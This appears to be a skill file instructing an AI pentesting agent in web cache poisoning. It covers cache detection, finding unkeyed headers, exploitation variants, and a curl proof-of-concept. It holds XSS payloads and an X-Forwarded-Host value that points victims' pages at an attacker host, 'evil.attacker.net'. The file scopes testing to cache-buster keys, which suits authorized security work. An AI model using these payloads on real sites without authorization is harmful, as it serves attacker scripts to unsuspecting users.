---
name: web-cache-poisoning
description: "Web cache poisoning — make a CDN/cache store a harmful response served to other users. Use when a cache fronts the app (Varnish/Cloudflare/Akamai/Fastly/nginx), responses carry X-Cache/Age/Vary, and unkeyed inputs (X-Forwarded-Host/Scheme/Proto, cookies, unkeyed params) reflect into cacheable output. Always use a cache buster."
---

# Web Cache Poisoning

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


## When to test
- A cache/CDN sits between the user and the app. Signals: `X-Cache: hit/miss`, `Age`, `CF-Cache-Status`, `X-Served-By`, `Cache-Control`, `Vary`, `Via` headers; static-ish pages that load fast on repeat.
- Some request input is **unkeyed** (ignored by the cache key) yet **reflected** into the response or used to build URLs/resources. Classic carriers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Host`, `X-Forwarded-Server`, unkeyed query params (`utm_*`), cookies, the `Host` port.
- The response is **cacheable** (right route, extension, status, content-type).

If there is no cache, or the reflected input is part of the cache key, or there is no usable gadget — this is not cache poisoning. See "Don't report as noise".

## Impact & priority
- **High signal** only when you can prove a harmful response is *cached and re-served to a different request*. Stored-XSS-to-all-users (poison a high-traffic page → every visitor runs your JS) is critical.
- Open redirect / resource hijack served from cache to all users = high.
- A reflection that is keyed, never cached, or has no gadget (no XSS sink, no redirect, no import) = noise. Don't log it.
- Cache TTL does not cap impact: a poison can be re-sent on a loop. But scope still matters — see safety below.

## Detection
1. **Identify the cache.** Send a request twice; inspect `X-Cache`, `Age`, `CF-Cache-Status`, `Via`. `miss` then `hit` = cached. Note `Cache-Control`/`Vary`.
2. **Find unkeyed inputs.** Add a cache buster to the URL (`?cb=<random>`), then inject candidate headers one at a time and watch the response. Burp **Param Miner** ("Guess headers"/"Guess params") automates this and auto-adds cache busters. Manual: send `X-Forwarded-Host: canary123` and grep the response for `canary123`.
3. **Confirm it's unkeyed.** Set the suspicious header, fetch twice with the *same* cache buster: if the second (clean) fetch returns your injected value with `X-Cache: hit`, the input is unkeyed and cacheable → poisonable.

## Exploitation
- **Unkeyed header → XSS:** input reflected into HTML/attribute (e.g. an Open Graph `og:image` URL built from `X-Forwarded-Host`). Inject `a."><script>alert(document.domain)</script>`.
- **Unsafe resource import:** header used to build `<script src>` / `<link href>`. Point `X-Forwarded-Host: evil.attacker.net` so all users load attacker JS/CSS.
- **Open redirect / scheme:** `X-Forwarded-Scheme: nothttps` or `X-Forwarded-Proto: http` can trigger a cached redirect to attacker URL.
- **Cookie handling:** response varies by a cookie that is *not* in the cache key → poison the shared entry for everyone.
- **DOM gadgets:** poisoned response feeds client-side JS (imported JSON, config) that hits a sink — e.g. `{"property":"<svg onload=alert(1)>"}`.
- **Multiple headers:** chain inputs (e.g. `X-Forwarded-Host` + `X-Forwarded-Scheme`) when one alone isn't enough.
- **Cache key injection / normalization:** cache normalizes encoded vs raw, or concatenates key parts with weak delimiters — make a poison entry whose key matches a victim's normal request.
- **Cache param cloaking:** parser discrepancy (cache keys only first `?`/up to `&`; app treats `;` or second `?` as delimiter) hides the payload from the key. Ruby/Rails `;` trick, last-duplicate-wins.
- **Fat GET:** cache keys the request line but app reads a body / `X-HTTP-Method-Override` — smuggle payload while keeping an innocent key.

## Methodology (PortSwigger)
1. Identify and evaluate **unkeyed inputs** (Param Miner + manual), always behind a cache buster.
2. Elicit a **harmful response** from the back-end using that input (find the gadget: reflection sink, import, redirect, DOM data).
3. Get that response **cached** — work out the conditions (path, extension, status, headers) so a clean victim request returns it.
   Always keep a cache buster on every probe so you only poison *your* test key.

## Minimal PoC (for ./_EXPLOIT/)
Use a unique cache buster so only your own entry is affected. Verify the *clean* fetch returns the payload with `X-Cache: hit`.
```bash
CB="poc-$(date +%s)-$RANDOM"          # unique test key — NOT the live homepage
URL="https://TARGET/en?cb=$CB"

# 1) Poison: inject unkeyed header on the buster URL
curl -s -D - "$URL" -H 'X-Forwarded-Host: a."><script>alert(document.domain)</script>"' -o /dev/null

# 2) Prove: clean request (no header) to the SAME buster URL returns the payload from cache
curl -s -D - "$URL" | tee /tmp/wcp.txt
grep -i 'x-cache\|age' /tmp/wcp.txt          # expect: X-Cache: hit
grep -F '<script>alert(document.domain)</script>' /tmp/wcp.txt   # payload served from cache
```
Log to `./_EXPLOIT/` the two requests, the `X-Cache: hit` proof on the clean request, and the reflected payload. Stop once proven — do not poison real, un-busted URLs.

## Don't report as noise
- Reflected input that is part of the **cache key** (your value never reaches another request).
- Responses that are **never cached** (`Cache-Control: no-store`, always `X-Cache: miss`, dynamic per-request).
- A reflection with **no gadget**: not in an HTML/JS sink, not used for an import or redirect, no DOM consumer.
- Self-only "poisoning" you couldn't reproduce from a separate clean request.

## Safety / scope gate
Cache poisoning affects OTHER users by design. Only ever poison your own **cache buster / test key** — never the live homepage or a shared key real users hit. Always include a unique buster on every probe and PoC. If you cannot isolate your entry, stop.

## Deep reference
See `reference.md` for cache mechanics, Param Miner workflow, full design- and implementation-flaw catalog, cache-buster placement, and prevention.
- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
